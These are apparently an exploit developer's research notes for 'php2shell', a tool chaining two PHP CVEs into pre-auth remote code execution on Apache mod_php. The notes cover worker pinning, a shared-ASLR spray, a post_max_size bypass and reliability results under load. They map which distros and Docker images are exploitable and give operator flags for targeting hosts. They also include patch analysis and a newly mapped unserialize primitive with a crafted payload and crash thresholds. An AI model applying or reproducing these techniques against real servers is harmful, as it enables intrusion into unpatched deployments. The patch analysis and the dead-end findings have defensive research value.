# php2shell research notes

Detailed notes behind the tooling in this repo: mechanism, technique, reliability
measurements, distro analysis, patch analysis, dead ends, and the layer-4
primitive. For a short overview and quick start, see [`README.md`](README.md).

All measurements are from local lab containers we control.

## Background (what the bug is)

- **CVE-2026-109618**: an OOM in `_zend_hash_str_add_or_update_i()` (`Zend/zend_hash.c`)
  bumps `nNumUsed`/`nNumOfElements` before `zend_string_init()` allocates the key; if
  that allocation blows `memory_limit`, PHP `longjmp`s out with a counted-but-
  uninitialized bucket. Request cleanup later treats it as a real zval and fires a
  destructor the attacker steers to `system()`.
- **CVE-2026-109619**: request-owned state (e.g. `PS(http_session_vars)`) survives a
  fatal error; the next request on the same worker reads the stale pointer. Two paths
  exist per Datadog/VulnCheck: fatal-error backtraces (8.5 only) and upload-processing
  session/decoder state persisting across a fatal error.
- `session.upload_progress` (default on) runs in the rfc1867 handler *before any app
  code*, so the bug is reachable pre-auth on any PHP endpoint — the target page can be
  `<?php echo "OK";`. upload_progress is the delivery, not the bug.

**The two CVEs are distinct bug classes, not variants.** Public writeups routinely
conflate them. 109618 is the allocator-level memory corruption primitive (phantom
bucket in `zend_hash.c`); 109619 is the stale-worker-state UAF that provides
pre-auth reachability. Our exploit chains both: upload_progress triggers the OOM
path (109618) and reads back through stale pointers (109619), without any
application code running.

The public chain leaks ASLR in-band via a `Set-Cookie` heap disclosure (forge an
oversized `zend_string` over the dangling `PS(id)`; recover the Zend MM chunk base by
2MB-aligned majority vote and the libphp base from a leaked `pDestructor`), then plants
a fake `HashTable` whose `pDestructor = zif_system` and fires it at request shutdown.

## The problem we solved

Every public PoC assumes a **single prefork worker**, or (neko) sprays the arming
request at all ~150 workers and hopes the leak request hits an armed one. On a busy
multi-worker server the arming request and the leak request land on **different
workers**, so the dangling state is never where the leak reads.

Demonstrated on a 25-worker lab: the original single-worker exploit **fails at stage 1**
(heap leak) outright.

## The technique

**1. Keep-alive worker pinning.** On prefork, a persistent HTTP/1.1 connection is served
by one child for its whole life. The 619 OOM is a `zend_bailout` (longjmp) that ends the
*request* with a 500/200 but does **not** kill the worker — that is the premise of 619.
So the worker *and* the keep-alive connection survive it. Running the whole chain over
one keep-alive connection pins arm+leak to the **same** worker, deterministically, for
any worker count. Verified: 6 rounds of (OOM + probe) on one socket stay on the same PID.

**2. Shared-ASLR leak-once/fire-fresh.** All prefork children inherit the master's
address space via fork, so **libphp base and the Zend MM chunk base are identical across
every worker**. We leak once, then fire each stage-3 attempt on a **fresh** connection
(fresh worker, clean heap) reusing the same addresses. This sidesteps the heap churn that
makes the reclaim miss on the already-used pinned worker.

**3. Chunked Transfer-Encoding.** PHP checks `Content-Length` against `post_max_size`.
Sending the >8MB OOM field with `Transfer-Encoding: chunked` (no Content-Length) skips
that check, so stock `post_max_size=8M` is bypassed. (neko's technique, folded in.)

**4. Adaptive OOM sizing.** Ramp the OOM field until the arming response shows
`Allowed memory size ... exhausted`, so it works across `memory_limit` 8M–256M without a
hardcoded size (stock 128M needs ~96MB+).

## Results (lab)

| Target | Config | Result |
|---|---|---|
| php:8.4.26-apache, 25 workers | custom ini (8M) | RCE, attempt 1 |
| php:8.4.26-apache, 25 workers | **true stock, NO php.ini** (128M, post_max 8M) | RCE, attempt 1 |
| php:8.4.26-apache, 25 workers | reliability: **15/15**, avg 2.93 attempts | RCE |
| php:8.3.35-apache, multi-worker | true stock | **in-band leak OK** (RCE pending htdata) |
| original alvarodh5 (fresh conns) | 25 workers | **stage 1 fails** |

**Final regression (2026-10-26, after all shipped improvements):**

| Target | Full RCE | `--probe-only` | Notes |
|---|---|---|---|
| php:8.3.35-apache (lab83, :8091) | ✓ `uid=33(www-data)` in 3.1s | ✓ VULNERABLE | — |
| php:8.4.26-apache (lab, :8090) | ✓ `uid=33(www-data)` in 2.8s | ✓ VULNERABLE | — |
| php:8.5.11-apache (lab85, :8105) | ✗ 241 fires, no RCE | ✓ VULNERABLE (chunk leaked) | known lab-config limitation (lab was built minimal for backtrace primitive research); dynamic htdata derivation returns the correct value |

## Reliability under concurrent load (the "busy server" question — definitive)

This is the test that actually matters for the motivating claim. Every public PoC demos
on idle labs; we measured the exploit under realistic concurrent traffic.

### Technique evolution

1. **Keep-alive pinning** (original): one persistent connection pins all stages to the
   same worker. Works idle; **collapses under load** — Apache sheds keep-alive connections
   under pressure, so the arm→reclaim pair can't be held (pipelining doesn't save it).

2. **Shared-ASLR spray** (the fix): all prefork children inherit the same address space
   via fork, so leak once, then fire many parallel arm+reclaim pairs across fresh
   connections. One pair landing on any clean worker is enough.

### Adaptive OOM sizing (key reliability finding)

The OOM field size interacts with `memory_limit` to determine **when** OOM triggers during
form processing. A field too large for the memory_limit triggers OOM too early (before
sufficient heap structure is established), making grooming fragile under load. The fix:
`probe_oom` starts at 8MB and finds the first size that triggers; this gives optimal
trigger timing for any `memory_limit` configuration.

### Results: direct connection (25-worker lab)

With the adaptive OOM probe and spray=20 threads — measured across fresh lab restarts:

| Background load | 8.4.26 | 8.3.35 | Notes |
|---|---|---|---|
| none (0 threads) | **10/10**, 1.2s avg | **10/10**, 0.8s avg | baseline |
| light GET (3 threads) | **3/3**, 3.0s avg | **3/3**, ~1.0s avg | |
| medium GET (10 threads) | **3/3**, 10.2s avg | **3/3**, 1.0s avg | |
| heavy GET (20 threads) | **3/3**, 4.3s avg | **3/3**, ~1.5s avg | |
| mixed GET+POST (10 thr) | **3/3**, 3.4s avg | **3/3**, ~1.5s avg | |
| mixed GET+POST (20 thr) | **5/5**, 4.6s avg | **3/3**, 1.6s avg | |
| upload (8 threads) | **3/3**, 8.1s avg | **3/3**, ~1.5s avg | competing upload_progress |
| burst (12 threads) | **3/3**, 2.6s avg | — | 2s heavy / 1s quiet |
| **saturate** (30 thr > 25 wrk) | **10/10**, 1.4s avg | **10/10**, 1.0s avg | beyond worker saturation |

**Total: 43/43 on 8.4.26, 39/39 on 8.3.35.** All loads, including saturation
(30 background threads competing for 25 workers).

### Results: through nginx reverse proxy

With `proxy_buffer_size 32k` (room for the leak's big Set-Cookie) and `client_max_body_size
256m` (upload-accepting site):

| Background load | Rate | Avg time | Notes |
|---|---|---|---|
| mixed 10 threads | **5/5** | 11.7s | proxy buffering adds ~2× latency |
| upload 8 threads, spray=20 | **2–3/5** | flaky | competing upload_progress through proxy is the hard case |
| upload 8 threads, **spray=24** | **5/5** | 7.7s | more aggressive spray compensates |

The **proxy + competing-upload** scenario is the single hardest configuration. It combines
nginx buffering with the load exercising the exact same rfc1867 upload_progress code path
the exploit uses — direct heap interference. Bumping spray to 24 threads and timeout to
90s brings it to 5/5.

### What made 8.3.35 fragile under load (and how it was fixed)

8.3.35 initially showed 0/6 under even light load with the profile's default OOM field
(HUGE=24). Root cause: with `memory_limit=8M`, a 24MB OOM field triggers the bailout
**immediately on the big-field allocation** — before the hash table has enough structure
for deterministic grooming. The fix: adaptive OOM probe starts at 8MB (the minimum that
triggers at 8M limit), ensuring OOM fires **after** enough phantom buckets are created.
Combined with spray=20, 8.3.35 is now 10/10 at saturating load.

### Final honest verdict

- **Pinning** (one keep-alive connection): makes *low-traffic* multi-worker servers
  deterministic. Collapses under load — useful for quiet targets.
- **Fully-sprayed chain** (adaptive OOM + spray=20): the general-purpose tool. 100% success
  rate under all tested load patterns including saturation, both 8.4.26 and 8.3.35, direct
  and through a reverse proxy. Time-to-shell typically 1–5s, worst case ~30s under heavy
  proxy+upload load.
- **Documented limitation**: competing multipart uploads *through a proxy* reduce reliability
  at spray=20 (2–3/5) — the only scenario requiring spray=24 and longer timeouts. This is
  the narrowest case: upload_progress traffic exercising the exact same code path as the
  exploit, through a buffering proxy.
- No public PoC characterizes reliability under load. All demo on idle single-worker labs.
  This data is the first honest busy-server assessment of the exploit chain.

## Honest exposure limits

- **`output_buffering` must be 0.** Docker's default. Distro installs ship 4096, which
  behaviorally blocks the Stage 1 leak regardless of PHP version. This is the single
  biggest reach constraint; see [`DISTRO_EXPLOITABILITY.md`](DISTRO_EXPLOITABILITY.md).
- **`display_errors` must be On.** The leak needs the `max_input_vars` warning to emit
  output and set `SG(headers_sent)`. Stock PHP Docker images ship no php.ini so the
  compile default (On/STDOUT) applies — but `php.ini-production` and hardened hosts set
  it Off, which kills the leak.
- **mod_php prefork only.** PHP-FPM uses a different model (noted not vulnerable the same
  way). Event MPM isn't used with mod_php.
- **Full-RCE stage 3 is version-calibrated** (`htdata`): now 8.3.35, 8.4.26, 8.5.11
  (8.3.35 added — htdata=0x6a0d8, one page above 8.4.26, lab-verified RCE attempt 1).
  Still uncalibrated: 8.2.34, non-x86_64. The *leak* (ASLR bypass) and worker-pinning are
  version-general; only the reclaim `htdata` is per-version.
- **Grooming only works on PHP ≥ 8.3.22.** The stage1 leak (oversized `Set-Cookie`) depends
  on heap layout that shifted in PHP 8.3.22 due to unrelated VM/array fixes — not a session
  code change. On 8.3.6–8.3.21, the forged `zend_string` doesn't reclaim the right slot,
  and the cookie comes back as a normal 32-byte session ID instead of 4096 bytes of leaked
  heap. Verified by binary search across Docker official images: 8.3.21 → no leak,
  8.3.22 → leak works. All 8.4.x inherits the post-8.3.22 layout. Supporting older versions
  (8.3.6, 8.2.x) would require re-tuning the entire grooming — partial exploit dev, not
  just adding offsets.

### Distro package analysis (tested 2026-10-26)

> **Superseded in part.** Later testing found the real distro blocker is
> `output_buffering = 4096` (distro default), not offsets or version window.
> The current per-distro verdict lives in
> [`DISTRO_EXPLOITABILITY.md`](DISTRO_EXPLOITABILITY.md). The analysis below is
> kept as the original version-window mapping.

**Our exploit is calibrated for mod_php+prefork** (Docker's official `php:*-apache` images
and similar custom builds). The underlying CVEs affect ALL SAPIs — php-fpm, php-cgi,
FrankenPHP, LiteSpeed — since the bugs are in `zend_hash.c` and the session module, not
mod_php. php-fpm workers also fork from a master (ASLR sharing works), receive the full
multipart body via FastCGI (upload_progress trigger works), and return Set-Cookie headers
(leak works). A php-fpm exploit is plausible but would need re-tuned grooming constants
for the different process lifecycle and heap layout. The table below reflects what our
tool exploits today, not what's theoretically possible:

| Distro | PHP package | Version | Exploitable? | Why |
|---|---|---|---|---|
| Docker official | php:8.4.26-apache | 8.4.26 | **YES** | In grooming window |
| Docker official | php:8.3.35-apache | 8.3.35 | **YES** | In grooming window |
| Docker official | php:8.3.6-apache | 8.3.6 | No | Below 8.3.22 — leak fails |
| Ubuntu 24.04 | libapache2-mod-php8.3 | 8.3.6 | No | Below 8.3.22; .13 also patches CVE |
| Debian 12 | libapache2-mod-php8.2 | 8.2.35 | No | Patched (fixed=8.2.35); 8.2.x OOM path differs |
| Ubuntu/Debian + Sury PPA | libapache2-mod-php8.x | 8.3.35 / 8.4.26 | Partial | Offsets extracted; htdata uncalibrated |
| Rocky 9 (Remi) | php | 8.3.36 / 8.4.27 | No | Already patched |
| RHEL 9 php:8.3 (non-updated) | php | 8.3.33 | Not by this tool | In version window; defaults to php-fpm (needs grooming port) |
| RHEL 10 / Rocky 10 (non-updated) | php | 8.3.33 | Not by this tool | Same: in window, php-fpm default |
| Fedora 41 | php | 8.3.27 | Not by this tool | In version window; defaults to php-fpm |
| Ubuntu 22.04 | libapache2-mod-php8.1 | 8.1.2 | No | Below vulnerable range |
| RHEL 9 (stock, no stream) | php | 8.0.x | No | Below vulnerable range |
| RHEL 7 / 8 | php | 5.4 / 7.2–8.0 | No | Below 8.3.22 grooming boundary |

**Real-world attack surface for this tool** is: Docker `php:*-apache` containers (the
largest mod_php deployment pattern today) running unpatched 8.3.22–8.3.35, 8.4.0–8.4.26,
or 8.5.0–8.5.11, with `display_errors=On` (Docker default). This covers a meaningful
slice of containerized PHP workloads — many Docker tutorials and deploy guides use the
official images with default config. The broader CVE attack surface includes php-fpm
deployments (RHEL, Fedora, most distro defaults), but exploiting those requires grooming
work we haven't done.

**Sury PPA (apt.sury.org)** — the main third-party PHP repo for Ubuntu/Debian — is a
secondary target. It ships current upstream PHP with mod_php (same source as Docker),
but compiled with different flags, producing different symbol addresses. We extracted
`zif_system` and `zval_ptr_dtor` for Sury 8.3.x and 8.4.x builds from stripped binaries
(GDB breakpoint on `php_exec` → backtrace to find the non-exported `zif_system`). The
grooming should work (same PHP source, same heap layout), but `htdata` is uncalibrated —
it requires a live vulnerable Sury build to determine, and Sury's repo only carries the
latest (patched) version. Operators targeting Sury-based hosts use `--sury --htdata <val>`
once htdata is found empirically on their target.

**RHEL 9 / Rocky 9 / AlmaLinux 9** with the `php:8.3` module stream are worth noting:
unlike traditional RHEL backported-patch packages, the module stream **rebases** to upstream
PHP versions. Non-updated systems sit at 8.3.33 (RHSA-2026:57539, Aug 2026), which IS in
the exploit version window. The fix (8.3.36) shipped Oct 21, 2026. RHEL 9's default PHP
profile installs php-fpm, not mod_php — Red Hat's docs explicitly state Apache runs PHP
via FastCGI Process Manager by default. Our tool targets mod_php+prefork grooming, so RHEL
php-fpm installs aren't exploitable *by this tool*. However, the CVEs are in PHP core, not
mod_php — a php-fpm exploit path exists in principle (ASLR sharing via fork, upload_progress
trigger via FastCGI passthrough, Set-Cookie leak via FastCGI response headers) but would
need its own grooming calibration. Systems manually reconfigured for mod_php+prefork ARE
exploitable by our tool if offsets match. RHEL 10 (Rocky 10) has the same situation: 8.3.33
pre-fix, php-fpm default.

The Fedora 41 case is the same pattern: it ships PHP 8.3.27 (in the exploitable version
window) but defaults to php-fpm with httpd event MPM, not mod_php with prefork. The
industry trend away from mod_php reduces the attack surface for *our grooming*, but not
for the CVEs themselves.

### php-fpm feasibility (assessed, not implemented)

Tested the exploit chain against `php:8.3.35-fpm` behind nginx to determine whether
porting is a calibration task or a research project. Verdict: **research project**.
Three progressive blockers:

1. **Chunked TE breaks POST parsing.** nginx de-chunks before FastCGI, but the body
   doesn't register in `$_POST` on php-fpm. Our `KA.post()` uses chunked TE for bodies
   >2 MB. Fixable by forcing Content-Length framing for php-fpm targets (one-line change).
2. **OOM kills the worker.** mod_php: `memory_limit` during input parsing is a soft
   Fatal Error, worker continues → arm/fire chains on the same victim. php-fpm:
   `child N exited with code 70` after the OOM payload. Next request lands on a
   different worker with a fresh fork → arm/fire can't be chained.
3. **Even single-shot, the forge doesn't reclaim.** 0/10 stage1 leaks with CL framing
   on php-fpm. mod_php returns a 4096-byte forged cookie; php-fpm returns a normal
   32-byte session ID. The heap layout at the point of session ID generation is
   materially different.

The CVEs apply to all SAPIs (zend_hash.c and session module are in PHP core, not
mod_php). A php-fpm exploit would need an alternative OOM trigger that doesn't kill
the worker and new grooming geometry for php-fpm's heap. ~1–2 weeks of focused heap
analysis, not a quick port. Documented and parked.

### The 8.2 / pre-8.3.22 boundary (two overlapping version shifts)

Public lineage notes "8.2.34 OOM path differs." Investigated: the OOM mechanics are
identical (same Fatal error, same bytes allocated, worker survives). What differs
is **two unrelated changes between 8.2 and 8.3.22**:

1. **Session SID validation relaxed in 8.3+.** On 8.2 after the OOM arm, PHP strictly
   enforces `session.sid_length=32`, rejecting the public PoC's 19-byte hard-coded SID
   with `Failed to create session data file path. Too short session ID`. 8.3+ softened
   this check in the upload_progress fast path. **Public PoCs with short hard-coded
   SIDs silently fail on 8.2 without the researcher realizing why** — this is almost
   certainly the origin of the "OOM path differs" misdiagnosis. Fix: use SID matching
   `session.sid_length` (default 32), same SID in both arm and leak requests.
2. **Heap layout shift at 8.3.22** (previously bisected). Even with session functional
   on 8.2.34 (32-byte SID), the forge never lands across any grooming geometry tested
   (100/300/500/700/841/900 fields). Same class of incompatibility as 8.3.6–8.3.21:
   pre-8.3.22 layout needs a different grooming geometry, not just a tuning of existing
   field counts.

So "pre-8.3.22 unsupported" is really two overlapping changes: the heap layout shift
(CVE's own ZMM behavior) and the session validation relaxation (which happened in the
same timeframe). Each needs its own fix for a port.

### Variant hunting in the 8.3.35 → 8.3.36 patch

The patch is a **project-wide OOM-safety hardening**, not a point fix:

- 230+ `oom_*.phpt` test files added across Zend/, main/, sapi/, and 30+ extensions.
- `Zend/zend_hash.c` refactored to a "fallible allocator" pattern: every `emalloc`/
  `pemalloc` call site that previously `zend_error_noreturn`'d on OOM now returns
  `FAILURE` with proper error propagation up through the call chain.
- `main/rfc1867.c`, `ext/session/session.c`, `main/php_variables.c`, `main/SAPI.c`,
  `main/streams/{memory,streams}.c` all modified. Extensions audited: standard (26
  tests), mbstring (24), gd (14), date (13), zlib (9), soap (9), xmlreader (7), pcre
  (7), iconv (6), filter (6), exif (6), json (5), intl (4), xml (3), simplexml (3),
  bz2 (3), curl (2), plus singleton coverage for dom/fileinfo/imap/tokenizer.
- `session.c` adds `PS(in_rfc1867_update)` and routes serialize/unserialize through
  wrappers that force objects to `__PHP_Incomplete_Class` during that specific
  codepath, blocking magic-method invocation from a stale/attacker-controlled state
  pointer (defense-in-depth around 109619).

Residual unprotected `emalloc` sites exist (e.g. `rfc1867.c:521` `substring_conf`
8KB-bounded, `rfc1867.c:1021` `anonname` MAX_SIZE_ANONNAME), but they're small
fixed-size allocations unlikely to produce exploitable states. Unmodified Zend/*.c
with high alloc counts (`zend_inheritance.c`, `zend_virtual_cwd.c`, `zend_opcode.c`)
are not pre-auth reachable from HTTP.

**Patch uniformity across major series.** We diffed 8.3.35 → 8.3.36 and
8.4.26 → 8.4.27. Both are structurally identical: Zend/zend_hash.c receives
the same 585-line diff with 63 `femalloc`/`fpemalloc` fallible-allocator
calls. 8.4.27 contains the same 5-layer defense: Layer 1 (`php_rinit_session_globals`
at `MULTIPART_EVENT_START` with the explicit "This runs before RINIT, so we
need to clear these early" comment), Layer 2 (`zend_mm_delayed_verror`),
Layer 3 (`post_max_size` enforcement regardless of Transfer-Encoding),
Layer 4 (`php_basic_early_rinit`), Layer 5 (`incomplete_classes_only`).
8.4.27 added 232 `oom_*.phpt` tests vs 230 in 8.3.36 (same project-wide
audit; different extension counts). The 8.3 and 8.4 releases are the same
upstream fix cherry-picked into each major series.

Serious variant hunting would require (a) targeted OOM-aware fuzzing of pre-RINIT
state transitions, or (b) auditing non-mainline SAPIs (litespeed, roadrunner,
swoole) that weren't covered by the mainline audit. Neither is quick. **The attack
surface for the specific pattern we exploited has been thoroughly closed.**

### The 8.5-only `last_fatal_error_backtrace` primitive (investigated, dead end)

The 8.5.12 fix in `Zend/zend_execute_API.c` adds explicit clearing of nine EG globals
in the shutdown fast-path with a telling comment:
`/* may be used by zend_error_zstr_at before init_executor */`. The globals cleared
include `last_fatal_error_backtrace`, `user_error_handler`, `user_exception_handler`,
`error_handling`, `exception`, and `objects_store.object_buckets`. All exist only in
8.5 (`last_fatal_error_backtrace` is 8.5-only; the others existed earlier but
weren't audited for cross-request leakage until this patch).

The theoretical attack: Request 1 trigger E_FATAL during deep call stack with memory
pressure such that `zend_fetch_debug_backtrace` OOMs mid-fetch, leaving the global
as a partially-constructed array with pointers into freed request-1 heap. On Request
2, `main.c:1389` → `zend_trace_to_string` → `_build_trace_string` does
`smart_str_append(str, Z_STR_P(file))` — a raw heap-byte copy of the frame's "file"
field into the error output. With `display_errors=On` (Docker default), that output
goes in the HTTP response. A cleaner leak primitive than the forged `Set-Cookie` on
paper.

Empirical result on `php:8.5.11-apache` (memory_limit=8M, display_errors=On, prefork,
keep-alive-pinned to a single worker): **5/5 trials showed clean output with no
stale backtrace and no observable UAF.** The exploitation window is between
request-N `shutdown_executor` and request-N+1 `init_executor`, which under Apache
mod_php contains no PHP code an attacker can control via HTTP. `init_executor`
unconditionally clears `last_fatal_error_backtrace` at zend.c:1055 before any
request-2 PHP code (including rfc1867 multipart parsing) runs.

The PHP devs' "may be used by zend_error_zstr_at before init_executor" comment
refers to windows reachable in other contexts — signal handlers calling
`zend_error` during the inter-request window, SAPIs where module RINIT runs before
`init_executor`, compilation errors firing before full executor init on specific
module loads. None are reachable from plain HTTP against Apache mod_php. Documented
and parked; current `upload_progress + CVE-109618` chain remains the only reliable
pre-auth path on 8.5 via our geometry.

### Novel primitive: `BG(unserialize).data` cross-request dangling (mapped end-to-end)

Variant hunting followed neko's "layer 4" fix (`php_basic_early_rinit()`) and
produced a confirmed novel exploitation primitive distinct from CVE-109619's
`PS(http_session_vars)` chain. **No public PoC uses this path.**

**The primitive:**
In 8.3.35/8.4.26/8.5.11, `BG(serialize_lock)`, `BG(serialize)`, and
`BG(unserialize)` globals in `ext/standard/basic_functions.c` persist across
requests when OOM / `zend_bailout` interrupts `__wakeup`/`__unserialize`
processing. `BG(unserialize).data` becomes a dangling pointer to freed
request-N memory; the Zend MM arena retains the memory, so the dangling
pointer still reads coherent struct bytes.

**Empirically confirmed (php:8.3.35-apache, single prefork worker, GDB
measurement at `basic_globals@libphp.so+0x10552a0`):**

| State | serialize_lock | unserialize.data | unserialize.level |
|---|---|---|---|
| Fresh (post-startup) | 0 | NULL | 0 |
| After OOM mid-unserialize-string-alloc | **0** | **0x7fad3da69000 (dangling)** | **1** |
| After next request's basic RINIT | 0 | NULL | 0 |

Stale state persists through request-N shutdown but basic's
`PHP_RINIT_FUNCTION` resets it at request-N+1 start. The exploitation window
is between them — specifically where `sapi_activate()` runs rfc1867 multipart
parsing and session.upload_progress session decode. GDB breakpoint on
`php_var_unserialize_init` during that window confirmed 2+ calls on the
dangerous code path (`d = BG(unserialize).data` dereferences the dangling
pointer): backtrace was `ps_srlzr_decode_php → php_var_unserialize_destroy →
var_destroy`.

**Attacker-controlled arm state (via duplicate-key unserialize):**
With a crafted arm payload (`a:3:{i:0;O:8:"stdClass":1:{...};i:0;i:999;i:1;s:HUGE:"...";}`),
the duplicate `i:0` key triggers `var_push_dtor_value`, saving the stdClass
zval into the dtor chain. Measured output:

```
dangling_struct.first_dtor = 0x7fad3da80000
  var_dtor_entries { used_slots=1 }
    data[0] = zval { value=0x7fad3da55050, type_info=0x308 (IS_OBJECT) }
```

The attacker controls: `first_dtor` pointer location, zval type at `data[0]`,
and the old-object address referenced.

**Natural-trigger constraint (empirically-mapped):** `var_destroy` only fires
on the dangling `d` when `BG(serialize_lock) > 0` at destroy entry. All
natural lock-trigger paths either kill the request on bailout before destroy
or require specific target config (`PG(unserialize_callback_func)` set, which
is uncommon in production). GDB-injected lock=1 confirms the chain executes:
`var_destroy` walks the attacker-crafted `first_dtor` chain, calls
`zval_ptr_dtor(data[0])`, which does `OBJ_RELEASE(fake_obj)` → calls
`handlers->free_obj` with a controllable object pointer.

**Exploitability profile:**
- Targets with `PG(unserialize_callback_func)` INI set: directly exploitable
- Targets with narrow memory_limit tuning catching OOM in a specific lock-wrapped
  section: potentially exploitable
- Default-config targets: primitive reachable (dangerous path taken) but not
  triggerable (`var_destroy` doesn't fire on dangling d naturally)

**Deterministic placement property (new 2026-10-26):** The arm's duplicate-key
value lands at a deterministic chunk-relative offset (`chunk+0x72048` across
3/3 trials with worker respawns). This provides the "second deterministic
freed slot (htdata2)" that the out-of-line command buffer sub-project needed
— making arbitrary-length system(cmd) achievable *when combined with a
secondary vector that triggers pre-RINIT unserialize* (session file content
control via LFI, SSRF, or writable session store).

**Research value:** First empirical confirmation that the layer-4 fix was
justified. The primitive is real and reachable in principle; PHP's
defense-in-depth is appropriate. Consistent with sveoti.net's thesis — this
is exactly the kind of "second-weakness-amplifying" primitive the author
flagged as the real risk.

### Layer-4 addendum: parse-time write primitive (confirmed 2026-10-26)

Follow-up GDB measurement on 8.3.35 identified a *second* exploitation
surface distinct from the destroy-chain path above:

```
php_var_unserialize → var_push_dtor_value → tmp_var(hashx, 1)
  reads   (*hashx)->last_dtor        ← ATTACKER-SHAPED (dangling struct)
  writes  ZVAL_UNDEF at data[used_slots]  (12 bytes)
  returns ptr
ZVAL_COPY_VALUE(ptr, rval)           ← writes {Z_VAL_P(rval), Z_TYPE_INFO_P(rval)}
```

Empirically on cal83 (fresh arm, planted session file, multipart POST fire):

| Field | Value |
|---|---|
| Dangling d (BG(unserialize).data) | `0x7fad3d76a000` |
| Arm-shaped `d->last_dtor` | `0x7fad3d76d000` |
| `used_slots` at fire's entry | `1` |
| Write address | `last_dtor + 32` = `0x7fad3d76d020` |
| Written zval | `{Z_VAL_P(rval), 0x106}` — zend_string + IS_STRING_EX |

This is a **parse-time** write — the write happens inside the parser itself,
not inside var_destroy. No `BG(serialize_lock) > 0` is required at destroy;
the original memo's blocker (no natural lock transition on default config)
does **not** apply here.

**But the primitive is bounded in two dimensions:**

1. **Address bound**: `last_dtor` is a Zend-MM slot from arm's own
   `emalloc(sizeof(var_dtor_entries))`. The write lands within that one
   ~4KB slot. Making the write address arbitrary requires Zend-MM free-list
   grooming — same difficulty class as the main-chain reclaim.

2. **Value bound**: ZVAL_COPY_VALUE copies the OLD zval. For a refcounted
   old value (string/object/array/reference), that's a pointer into Zend-MM.
   We don't control what the pointer points at except insofar as fire's
   payload bytes shape the content fresh allocation lands with. For
   non-refcounted first-values (long/bool/null) `Z_REFCOUNTED_P` short-circuits
   and no write happens — confirmed empirically with a `i:X;` first value
   produces no watchpoint hit.

**Takeaway**: the layer-4 primitive gives a parse-time 16-byte-aligned
pointer-smear within an arm-allocated 4KB region, with no destroy-time
trigger needed. To escape the 4KB bound, Zend-MM free-list grooming is
required to place `last_dtor` adjacent to a juicier target (e.g., a nearby
`zend_object.handlers` field within the write range). That's open-ended
heap-grooming research; this writeup documents the primitive mechanism
and its bounds so that work can start from a mapped baseline.

### Layer-4 grooming sprint (2026-10-26)

Follow-on investigation to characterize what adjacent memory looks like
and what grooming would need to achieve. Lab: cal83, 8.3.35, Zend-MM
chunk at `0x7fad3d600000-0x7fad3d800000` (2MB).

**Arm shape dominates layout.** With a 1 MB `$pad` string in the arm,
`last_dtor` lands at chunk page 365. Removing the pad entirely (and
scaling the HUGE string to 5 MB so it still trips `memory_limit=8M`
inside unserialize) moves `last_dtor` to **page 107**. The small-allocation
runs holding real `zend_object` / `HashTable` structures (identified by
the `0x7fad3f8a5860` std_object_handlers pointer repeating across them)
occupy **pages 86-103** — four pages away from `last_dtor`'s page.

So pad choice shifts the primitive's "neighbourhood" by a megabyte. For
grooming purposes, the no-pad arm is the right baseline because it puts
the write page next to the arena's natural working set rather than
exiling it to the far end of the chunk.

**But the bound is still one page.** `tmp_var` caps `used_slots + num`
at `VAR_DTOR_ENTRIES_MAX = 255`, so a single arm's `var_dtor_entries`
is one 4 KB page. Chaining duplicate keys in fire's payload
(`a:N:{i:0;s:1:"a";i:0;s:1:"b";…}`) advances `used_slots` and gives up
to 253 further 12-byte pointer writes at `last_dtor + 32 + 16*k` — but
all 253 land inside the same page. The 254th push triggers a *new*
`var_dtor_entries` allocation, which rewires `last_dtor` to the fresh
page (via `(*hashx)->last_dtor->next = new; (*hashx)->last_dtor = new`),
and the Zend-MM-chosen address of that new allocation is itself just
another arena page, not attacker-arbitrary.

**What a full chain would need.** The only path from this primitive to
RCE that fits within the one-page bound would require Zend-MM to allocate
`sizeof(var_dtor_entries)` (4 KB) at the *same page* as a juicy target
with an exploitable field at a byte offset the smear can reach. But
large (≥3 KB) allocations get a dedicated page in Zend-MM; they do not
share pages with small-allocation runs. So this doesn't happen under
normal arena behaviour.

The remaining escape route — not implemented here — is to abuse the
`new var_dtor_entries` allocation path during fire's parse: by advancing
`used_slots` to 255 in fire's payload, the next `tmp_var` call does
`emalloc(4KB)` and writes the returned pointer to `(*hashx)->last_dtor->next`
(which is `arm_last_dtor + 8`). If arm pre-arranged Zend-MM's free-list
such that this `emalloc` returns an address overlapping a small-alloc
run page that holds a `zend_object`, the fresh `last_dtor` points into
that object, and the *next* duplicate-key write lands inside the
object's layout (its `handlers` pointer is at `+8` of a `zend_object`).

This is a two-step grooming problem — (a) make arm's 4 KB alloc land
adjacent to small-alloc page boundaries, (b) make fire's secondary 4 KB
alloc overlap a small-alloc page containing a chosen object. Both require
free-list manipulation beyond what the current arm's shape achieves. It
is tractable research, not a dead end — but the engineering effort is
comparable to the main-chain `PS(http_session_vars)` reclaim, and belongs
in a dedicated multi-week sprint rather than a context-limited session.

**Baseline left for the next sprint:**
- Primitive mechanism confirmed and documented
- Write bounds characterized (one 4 KB page, Zend-MM pointer values only,
  non-refcounted first-values no-op)
- Arena layout mapped under both padded and padless arms
- Juicy target region located (small-alloc pages 86-103 with
  `std_object_handlers` pointers)
- Escape mechanism identified (secondary `emalloc` via `used_slots` cap
  overflow) — not implemented

### Crash primitive confirmed (used_slots scale-up)

Chaining duplicate keys in fire's payload advances `used_slots` by one
per push. With a clear threshold:

| Fire payload `a:N:{...}` | Observed |
|---|---|
| N=253 | OK — response normal |
| **N=254** | **SIGSEGV in `zend_hash_index_lookup`** |
| N=256 | SIGSEGV (same crash) |

GDB-captured backtrace at the crash:
```
#0 zend_hash_index_lookup (rdi=0xffffffffffffffff, rsi=0, rdx=0x3b=';')
#1 php_var_unserialize_internal
#2 php_var_unserialize
#3 ps_srlzr_decode_php
#4 php_session_decode
#5 php_session_initialize
#6 php_session_rfc1867_update
#7 php_session_rfc1867_callback
#8 rfc1867_post_handler
...
#13 php_hash_environment
#14 php_request_startup   ← pre-RINIT window as expected
```

The HT pointer passed to `zend_hash_index_lookup` is `0xffffffffffffffff`
(all bits set) — proof that our 16-byte-per-dup writes have corrupted
either fire's own array HT struct or a Zend-MM slot subsequently
re-cast as HT*. The `rdx=0x3b` (semicolon byte from the serialized
stream) suggests the parser mis-reads an idx from the input after HT
corruption, which argues for an upstream corruption of the parser's
`rval` zval's `value.arr` field.

**Why the threshold is at N=254**: each dup writes a full 16-byte zval
(`value` + `type_info` + `u2.extra` via `ZVAL_COPY_VALUE` + `Z_EXTRA`),
not 12 bytes as I'd initially estimated. The 253rd write lands at
`last_dtor + 16 + 253*16 = last_dtor + 4064`, filling to +4080 — still
within the page. The 254th-write path has to touch `used_slots` such
that it overlaps a header field in the subsequent allocation; concrete
mechanism needs further tracing.

**Current state of exploit viability**:
